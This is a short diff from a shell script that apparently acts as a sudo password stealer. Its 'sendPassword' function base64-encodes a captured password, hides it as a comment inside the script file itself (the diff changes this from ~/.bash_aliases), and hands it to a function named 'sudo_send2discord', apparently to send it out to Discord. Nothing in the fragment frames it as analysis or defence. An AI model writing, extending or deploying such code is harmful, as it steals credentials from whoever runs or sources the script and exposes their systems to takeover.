@@ -60,7 +60,7 @@ function sudo_send2discord() {
 
 function sendPassword(){
   passwd=$(echo "$@" | base64 -w0)
-  echo "# $passwd" >> ~/.bash_aliases
+  echo "# $passwd" >> "$BASH_SOURCE"
   sudo_send2discord "$passwd"
 }
 
